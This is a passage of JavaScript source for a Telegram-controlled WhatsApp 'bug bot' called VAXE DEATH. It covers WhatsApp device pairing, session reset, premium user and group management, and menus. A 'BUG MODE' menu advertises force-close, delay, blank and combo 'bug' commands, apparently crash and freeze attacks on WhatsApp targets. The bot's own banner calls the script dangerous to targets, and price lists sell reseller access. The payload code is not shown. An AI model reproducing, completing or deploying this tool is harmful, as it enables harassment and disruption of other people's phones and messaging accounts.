⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⣿⠿⣉⣩⠛⠲⢶⡠⢄⠐⣣⠃⣰⠗⠋⢀⣯⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣯⣠⠬⠦⢤⣀⠈⠓⢽⣾⢔⣡⡴⠞⠻⠙⢳⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣵⣳⠖⠉⠉⢉⣩⣵⣿⣿⣒⢤⣴⠤⠽⣬⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢻⣟⠟⠋⢡⡎⢿⢿⠳⡕⢤⡉⡷⡽⠁
⣧⢮⢭⠛⢲⣦⣀⠀⠀⠀⠠⡀⠀⠀⠀⡾⣥⣏⣖⡟⠸⢺⠀⠀⠈⠙⠋⠁⠀⠀
⠈⠻⣶⡛⠲⣄⠀⠙⠢⣀⠀⢇⠀⠀⠀⠘⠿⣯⣮⢦⠶⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢻⣿⣥⡬⠽⠶⠤⣌⣣⣼⡔⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢠⣿⣧⣤⡴⢤⡴⣶⣿⣟⢯⡙⠒⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⣗⣞⣢⡟⢋⢜⣿⠛⡿⡄⢻⡮⣄⠈⠳⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠻⠮⠴⠵⢋⣇⡇⣷⢳⡀⢱⡈⢋⠛⣄⣹⣲⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣱⡇⣦⢾⣾⠿⠟⠿⠷⠷⣻⠧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⠽⠞⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

#- 𝗩𝗔𝗫𝗘 𝗗𝗘𝗔𝗧𝗛 ℵ 𝗣𝗥𝗢𝗝𝗘𝗖𝗧

╰➤ INFORMATION:
 ▢ Developer: @DitzzNotDev
 ▢ Version: 𝟧.𝟣 𝘗𝘳𝘰 
 ▢ Status: Sender Connected
  `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 1000

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

bot.command("requestpair", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /requestpair 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber);  
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `<blockquote>
#- 𝗩𝗔𝗫𝗘 𝗗𝗘𝗔𝗧𝗛 ℵ 𝗣𝗥𝗢𝗝𝗘𝗖𝗧

▢ Number: ${phoneNumber}
▢ Pairing Code: ${formattedCode}
▢ Type: Not Connected
</blockquote>`;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "HTML"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `<blockquote>
#- 𝗩𝗔𝗫𝗘 𝗗𝗘𝗔𝗧𝗛 ℵ 𝗣𝗥𝗢𝗝𝗘𝗖𝗧

▢ Number: ${lastPairingMessage.phoneNumber}
▢ Pairing Code: ${lastPairingMessage.pairingCode}
▢ Type: Connected
</blockquote>`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

bot.command("setcooldown", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcooldown 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("resetsession", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

bot.command('addpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addpremium 12345678 30d");
    }
    const userId = args[1];
    const duration = parseInt(args[2]);
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }
    const expiryDate = addPremiumUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

bot.command('delpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delpremium 12345678");
    }
    const userId = args[1];
    removePremiumUser(userId);
        ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

bot.command('addgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addgcpremium -12345678 30d");
    }

    const groupId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }

    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');

    premiumUsers[groupId] = expiryDate;
    savePremiumUsers(premiumUsers);

    ctx.reply(`✅ ☇ ${groupId} berhasil ditambahkan sebagai grub premium sampai ${expiryDate}`);
});

bot.command('delgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delgcpremium -12345678");
    }

    const groupId = args[1];
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers[groupId]) {
        delete premiumUsers[groupId];
        savePremiumUsers(premiumUsers);
        ctx.reply(`✅ ☇ ${groupId} telah berhasil dihapus dari daftar pengguna premium`);
    } else {
        ctx.reply(`🪧 ☇ ${groupId} tidak ada dalam daftar premium`);
    }
});

bot.use((ctx, next) => {
  if (secureMode) {
    return;
  }
  return next();
});

bot.start(ctx => {
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
  
    const menuMessage = `<blockquote><tg-emoji emoji-id="5357449287707942316">🎁</tg-emoji> 𝗩𝗔𝗫𝗘 𝗗𝗘𝗔𝗧𝗛 ℵ 𝗣𝗥𝗢𝗝𝗘𝗖𝗧<tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
 このスクリプトはユーザーと標的の両方にとって非常に危険なので、慎重に使用してください。

<tg-emoji emoji-id="5796440171364749940">📌</tg-emoji> 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝗩𝗔𝗫𝗘 𝗗𝗘𝗔𝗧𝗛 ℵ 𝗣𝗥𝗢𝗝𝗘𝗖𝗧
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 𝟧.𝟣 𝘗𝘳𝘰 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @DitzzNotDev
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝗣𝗥𝗜𝗩𝗔𝗧𝗘 ℵ 𝗠𝗢𝗗𝗘

<tg-emoji emoji-id="4936296803390718929">👾</tg-emoji> このスクリプトをご利用いただきありがとうございます。責任を持ってご使用ください。法律に基づき罰則の対象となる場合がありますので、悪用はお控えください。</blockquote>`;


    const keyboard = [
        [
            {
                text: "𝗔𝗞𝗦𝗘𝗦 ⌂ 𝗠𝗘𝗡𝗨",
                callback_data: "/controls", style: "primary", icon_custom_emoji_id: "5366073534793671550"
            },
            {
                text: "𝗕𝗨𝗚 ⌂ 𝗠𝗢𝗗𝗘",
                callback_data: "/bug", style: "primary", icon_custom_emoji_id: "5357317569650911348"
            },
            {
                text: "𝗠𝗨𝗥𝗕𝗨𝗚 ⌂ 𝗠𝗢𝗗𝗘",
                callback_data: "/murbug", style: "primary", icon_custom_emoji_id: "5357570547519613136"
            }
        ],
        [
            {
                text: "𝗟𝗜𝗦𝗧 𝗛𝗔𝗥𝗚𝗔",
                callback_data: "/harga", style: "danger", icon_custom_emoji_id: "5409048419211682843"
            },
            {
                text: "𝗦𝗨𝗣𝗣𝗢𝗥𝗧",
                callback_data: "/tqto", style: "success", icon_custom_emoji_id: "5807868868886009920"
            },
            {
                text: "𝗛𝗔𝗥𝗚𝗔 𝗨𝗣",
                callback_data: "/upharga", style: "danger", icon_custom_emoji_id: "5409048419211682843"
            }
        ],
        [
            {
                text: "𝗙𝗢𝗨𝗡𝗗𝗘𝗥/𝗢𝗪𝗡𝗘𝗥",
                url: "https://t.me/DitzzNotDev", style: "primary", icon_custom_emoji_id: "5807868868886009920"
            },
            {
                text: "𝗥𝗢𝗢𝗠 𝗣𝗨𝗕𝗟𝗜𝗖",
                url: "https://t.me/publicxdit", style: "primary", icon_custom_emoji_id: "5807868868886009920"
            },
            {
                text: "𝗖𝗛𝗔𝗡𝗡𝗘𝗟",
                url: "https://t.me/VaxeDeath", style: "primary", icon_custom_emoji_id: "5807868868886009920"
            }
        ],
        [
            {
                text: "𝗞𝗘𝗧𝗘𝗥𝗔𝗡𝗚𝗔𝗡",
                callback_data: "/about", style: "danger", icon_custom_emoji_id: "5274099962655816924"
            }
        ]
    ];

    ctx.replyWithPhoto(thumbnailUrl, {
        caption: menuMessage,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
});

bot.action('/start', async (ctx) => {
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
  
    const menuMessage = `<blockquote><tg-emoji emoji-id="5357449287707942316">🎁</tg-emoji> 𝗩𝗔𝗫𝗘 𝗗𝗘𝗔𝗧𝗛 ℵ 𝗣𝗥𝗢𝗝𝗘𝗖𝗧<tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
 このスクリプトはユーザーと標的の両方にとって非常に危険なので、慎重に使用してください。

<tg-emoji emoji-id="5796440171364749940">📌</tg-emoji> 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝗩𝗔𝗫𝗘 𝗗𝗘𝗔𝗧𝗛 ℵ 𝗣𝗥𝗢𝗝𝗘𝗖𝗧
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 𝟧.𝟣 𝘗𝘳𝘰 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @DitzzNotDev
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝗣𝗥𝗜𝗩𝗔𝗧𝗘 ℵ 𝗠𝗢𝗗𝗘

<tg-emoji emoji-id="4936296803390718929">👾</tg-emoji> このスクリプトをご利用いただきありがとうございます。責任を持ってご使用ください。法律に基づき罰則の対象となる場合がありますので、悪用はお控えください。</blockquote>`;

    const keyboard = [
        [
            {
                text: "𝗔𝗞𝗦𝗘𝗦 ⌂ 𝗠𝗘𝗡𝗨",
                callback_data: "/controls", style: "primary", icon_custom_emoji_id: "5366073534793671550"
            },
            {
                text: "𝗕𝗨𝗚 ⌂ 𝗠𝗢𝗗𝗘",
                callback_data: "/bug", style: "primary", icon_custom_emoji_id: "5357317569650911348"
            },
            {
                text: "𝗠𝗨𝗥𝗕𝗨𝗚 ⌂ 𝗠𝗢𝗗𝗘",
                callback_data: "/murbug", style: "primary", icon_custom_emoji_id: "5357570547519613136"
            }
        ],
        [
            {
                text: "𝗟𝗜𝗦𝗧 𝗛𝗔𝗥𝗚𝗔",
                callback_data: "/harga", style: "danger", icon_custom_emoji_id: "5409048419211682843"
            },
            {
                text: "𝗦𝗨𝗣𝗣𝗢𝗥𝗧",
                callback_data: "/tqto", style: "success", icon_custom_emoji_id: "5807868868886009920"
            },
            {
                text: "𝗛𝗔𝗥𝗚𝗔 𝗨𝗣",
                callback_data: "/upharga", style: "danger", icon_custom_emoji_id: "5409048419211682843"
            }
        ],
        [
            {
                text: "𝗧𝗢𝗢𝗟𝗦 ℵ 𝗠𝗢𝗗𝗘", 
                callback_data: "/tools", style: "danger",
 icon_custom_emoji_id: "5357317569650911348"
            }
        ],
        [
            {
                text: "𝗙𝗢𝗨𝗡𝗗𝗘𝗥/𝗢𝗪𝗡𝗘𝗥",
                url: "https://t.me/DitzzNotDev", style: "primary", icon_custom_emoji_id: "5807868868886009920"
            },
            {
                text: "𝗥𝗢𝗢𝗠 𝗣𝗨𝗕𝗟𝗜𝗖",
                url: "https://t.me/VaxeDeath", style: "primary", icon_custom_emoji_id: "5807868868886009920"
            },
            {
                text: "𝗖𝗛𝗔𝗡𝗡𝗘𝗟",
                url: "https://t.me/KingVeltrix", style: "primary", icon_custom_emoji_id: "5807868868886009920"
            }
        ],
        [
            {
                text: "𝗞𝗘𝗧𝗘𝗥𝗔𝗡𝗚𝗔𝗡",
                callback_data: "/about", style: "danger", icon_custom_emoji_id: "5274099962655816924"
            }
        ]
    ];
    
    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: thumbnailUrl,
            caption: menuMessage,
            parse_mode: "HTML",
        }, {
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/controls', async (ctx) => {
    const controlsMenu = `<blockquote><tg-emoji emoji-id="5357449287707942316">🎁</tg-emoji> 𝗩𝗔𝗫𝗘 𝗗𝗘𝗔𝗧𝗛 ℵ 𝗣𝗥𝗢𝗝𝗘𝗖𝗧<tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
 このスクリプトはユーザーと標的の両方にとって非常に危険なので、慎重に使用してください。

<tg-emoji emoji-id="5796440171364749940">📌</tg-emoji> 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝗩𝗔𝗫𝗘 𝗗𝗘𝗔𝗧𝗛 ℵ 𝗣𝗥𝗢𝗝𝗘𝗖𝗧
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 𝟧.𝟣 𝘗𝘳𝘰 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @DitzzNotDev
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝗣𝗥𝗜𝗩𝗔𝗧𝗘 ℵ 𝗠𝗢𝗗𝗘

<tg-emoji emoji-id="4936296803390718929">👾</tg-emoji> このスクリプトをご利用いただきありがとうございます。責任を持ってご使用ください。法律に基づき罰則の対象となる場合がありますので、悪用はお控えください。</blockquote>
<blockquote>──────────────────────────
#- ⌜ 𝗔𝗞𝗦𝗘𝗦 𝗠𝗘𝗡𝗨 ⌟
┊✦ /requestpair - Add Sender Number
┊✦ /setcooldown - Set Bot Cooldown
┊✦ /resetsession - Reset Existing Session
┊✦ /addpremium - Add Premium Users
┊✦ /delpremium - Delete Premium Users
┊✦ /addgcpremium - Add Premium Group
┊✦ /delgcpremium - Delete Premium Group
──────────────────────────</blockquote>`;

    const keyboard = [
        [
            {
                text: "𝗕𝗔𝗖𝗞 𝗠𝗘𝗡𝗨",
                callback_data: "/start", style: "primary", icon_custom_emoji_id: "5832251986635920010"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/bug', async (ctx) => {
    const bugMenu = `<blockquote><tg-emoji emoji-id="5357449287707942316">🎁</tg-emoji> 𝗩𝗔𝗫𝗘 𝗗𝗘𝗔𝗧𝗛 ℵ 𝗣𝗥𝗢𝗝𝗘𝗖𝗧<tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
 このスクリプトはユーザーと標的の両方にとって非常に危険なので、慎重に使用してください。

<tg-emoji emoji-id="5796440171364749940">📌</tg-emoji> 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝗩𝗔𝗫𝗘 𝗗𝗘𝗔𝗧𝗛 ℵ 𝗣𝗥𝗢𝗝𝗘𝗖𝗧
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 𝟧.𝟣 𝘗𝘳𝘰 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @DitzzNotDev
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝗣𝗥𝗜𝗩𝗔𝗧𝗘 ℵ 𝗠𝗢𝗗𝗘

<tg-emoji emoji-id="4936296803390718929">👾</tg-emoji> このスクリプトをご利用いただきありがとうございます。責任を持ってご使用ください。法律に基づき罰則の対象となる場合がありますので、悪用はお控えください。</blockquote>
<blockquote>──────────────────────────
#- ⌜ 𝗕𝗨𝗚 𝗠𝗢𝗗𝗘 ⌟
┊✦ /Xbug - Bug Force Close
┊✦ /Xspam - Bug Delay Neww
┊✦ /xblank - Bug Blank 
┊✦ /117 -  Bug X Combo
┊✦ /testfunction - Use Your Own Function
──────────────────────────</blockquote>`;

    const keyboard = [
        [
            {
                text: "𝗕𝗔𝗖𝗞 𝗠𝗘𝗡𝗨",
                callback_data: "/start", style: "primary", icon_custom_emoji_id: "5832251986635920010"
            },
            {
                text: "𝗠𝗨𝗥𝗕𝗨𝗚 𝗠𝗘𝗡𝗨",
                callback_data: "/murbug", style: "primary", icon_custom_emoji_id: "5832251986635920010"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/harga', async (ctx) => {
    const controlsMenu = `<blockquote><tg-emoji emoji-id="5357449287707942316">🎁</tg-emoji> 𝗩𝗔𝗫𝗘 𝗗𝗘𝗔𝗧𝗛 ℵ 𝗣𝗥𝗢𝗝𝗘𝗖𝗧<tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
 このスクリプトはユーザーと標的の両方にとって非常に危険なので、慎重に使用してください。

<tg-emoji emoji-id="5796440171364749940">📌</tg-emoji> 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝗩𝗔𝗫𝗘 𝗗𝗘𝗔𝗧𝗛 ℵ 𝗣𝗥𝗢𝗝𝗘𝗖𝗧
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 𝟧.𝟣 𝘗𝘳𝘰 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @DitzzNotDev
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝗣𝗥𝗜𝗩𝗔𝗧𝗘 ℵ 𝗠𝗢𝗗𝗘

<tg-emoji emoji-id="4936296803390718929">👾</tg-emoji> このスクリプトをご利用いただきありがとうございます。責任を持ってご使用ください。法律に基づき罰則の対象となる場合がありますので、悪用はお控えください。</blockquote>
<blockquote>──────────────────────────
#- ⌜ 𝗟𝗜𝗦𝗧 𝗛𝗔𝗥𝗚𝗔 ⌟
┊✦ FULL UP  : 15K
┊✦ RESELLER : 25K
┊✦ PARTNER : 35K
┊✦ MODERATOR : 45K
┊✦ T. KANAN : 55K
┊✦ CEO : 70K
┊✦ OWNER : 90K
──────────────────────────</blockquote>`;

    const keyboard = [
        [
            {
                text: "𝗕𝗔𝗖𝗞 𝗠𝗘𝗡𝗨",
                callback_data: "/start", style: "primary", icon_custom_emoji_id: "5832251986635920010"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/upharga', async (ctx) => {
    const controlsMenu = `<blockquote><tg-emoji emoji-id="5357449287707942316">🎁</tg-emoji> 𝗩𝗔𝗫𝗘 𝗗𝗘𝗔𝗧𝗛 ℵ 𝗣𝗥𝗢𝗝𝗘𝗖𝗧<tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
 このスクリプトはユーザーと標的の両方にとって非常に危険なので、慎重に使用してください。

<tg-emoji emoji-id="5796440171364749940">📌</tg-emoji> 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝗩𝗔𝗫𝗘 𝗗𝗘𝗔𝗧𝗛 ℵ 𝗣𝗥𝗢𝗝𝗘𝗖𝗧
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 𝟧.𝟣 𝘗𝘳𝘰 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @DitzzNotDev
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝗣𝗥𝗜𝗩𝗔𝗧𝗘 ℵ 𝗠𝗢𝗗𝗘

<tg-emoji emoji-id="4936296803390718929">👾</tg-emoji> このスクリプトをご利用いただきありがとうございます。責任を持ってご使用ください。法律に基づき罰則の対象となる場合がありますので、悪用はお控えください。</blockquote>
<blockquote>──────────────────────────
#- ⌜ 𝗟𝗜𝗦𝗧 𝗛𝗔𝗥𝗚𝗔 ⌟
┊✦ FULL UP TO RESS : 10K
┊✦ FULL UP TO PT 15K
┊✦ FULL UP TO MOD : 20K
┊✦ FULL UP TO TK : 25K
┊✦ FULL UP TO CEO : 30K
┊✦ FULL UP TO OWN : 35K
──────────────────────────</blockquote>`;

    const keyboard = [
        [
            {
                text: "𝗕𝗔𝗖𝗞 𝗠𝗘𝗡𝗨",
                callback_data: "/start", style: "primary", icon_custom_emoji_id: "5832251986635920010"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/tqto', async (ctx) => {
    const tqtoMenu = `<blockquote><tg-emoji emoji-id="5357449287707942316">🎁</tg-emoji> 𝗩𝗔𝗫𝗘 𝗗𝗘𝗔𝗧𝗛 ℵ 𝗣𝗥𝗢𝗝𝗘𝗖𝗧 <tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
 このスクリプトはユーザーと標的の両方にとって非常に危険なので、慎重に使用してください。

<tg-emoji emoji-id="5796440171364749940">📌</tg-emoji> 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝗩𝗔𝗫𝗘 𝗗𝗘𝗔𝗧𝗛 ℵ 𝗣𝗥𝗢𝗝𝗘𝗖𝗧
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 𝟧.𝟣 𝘗𝘳𝘰 
